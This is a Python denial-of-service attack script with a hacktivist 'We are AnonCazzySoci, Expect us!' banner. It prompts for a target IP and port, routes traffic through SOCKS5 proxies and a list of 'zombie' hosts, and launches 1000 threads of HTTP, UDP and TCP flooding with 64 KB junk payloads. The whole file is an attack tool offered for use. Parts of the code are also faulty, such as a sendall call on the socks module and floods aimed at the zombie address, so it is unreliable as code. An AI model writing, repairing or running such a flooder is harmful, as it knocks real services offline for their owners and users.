import socket
import random
import threading
import socks
import time
import requests

credit = """
\033[1;36m
 ▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
 ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
 ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░
                                         ░                  ░        ░         ░ ░                       ░          
╔════════════════════════╗
║ Created by: CazzySoci  ║
║                        ║
║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔           ║
║                        ║
║  We Are AnonCazzySoci  ║
║    •We don't die       ║
║    •We Multiply        ║
║    •Expect us!         ║
╚════════════════════════╝
\033[1;36m
"""


print(credit)

target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port: "))

proxy_list = []
with open("socks5.txt", "r") as file:
    for line in file:
        proxy_ip, proxy_port = line.strip().split(":")
        proxy_list.append((proxy_ip, int(proxy_port)))


zombies_list = []
with open("zombies.txt", "r") as file:
    for line in file:
        zombie_ip, zombie_port = line.strip().split(":")
        zombies_list.append((zombie_ip, int(zombie_port)))

user_agents = []
with open("ua.txt", "r") as file:
    for line in file:
        user_agents.append(line.strip())

num_threads = 1000

num_packets = 1000

payload_size = 65535

attack_status = False

def ddos_attack():
    global attack_status
    while True:
        
        proxy_ip, proxy_port = random.choice(proxy_list)
        socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
        socket.socket = socks.socksocket
        try:
            zombie_ip, zombie_port = random.choice(zombies_list)
            user_agent = random.choice(user_agents)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((zombie_ip, zombie_port))

            payload_bytes = b"A" * payload_size

            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
            request += payload_bytes.decode()

            for _ in range(num_packets):
                socks.sendall(request.encode())

            s.close()

            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_payload = b"A" * payload_size
            udp_socket.sendto(udp_payload, (zombie_ip, target_port))
            udp_socket.close()

            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_socket.connect((zombie_ip, target_port))
            tcp_payload = b"A" * payload_size
            tcp_socket.sendall(tcp_payload)
            tcp_socket.close()

            attack_status = True

        except Exception as e:
            
            print("Error: {}".format(str(e)))

for _ in range(num_threads):
    t = threading.Thread(target=ddos_attack)
    t.start()

print("DDoS attack initiated!")

while True:
    if attack_status:
        print("Attack in progress...")
    else:
        print("No active attacks.")

    time.sleep(10)
    random.shuffle(proxy_list)
